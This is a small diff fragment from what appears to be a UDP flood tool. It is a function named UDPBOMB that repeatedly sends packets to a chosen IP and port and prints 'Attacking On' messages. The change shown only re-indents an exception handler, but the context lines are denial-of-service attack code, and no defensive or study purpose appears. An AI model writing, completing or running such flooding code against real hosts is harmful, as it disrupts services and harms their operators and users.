@@ -111,7 +111,7 @@ def UDPBOMB():
                sock.sendall(byte_packet)
                sock.sendall(byte_packet)
            print(f"Attacking On {ip}:{port} with UDP")
-       except socket.error:
+        except socket.error:
            print(f"Attacking On {ip}:{port} with UDP")
            sock.close()
     
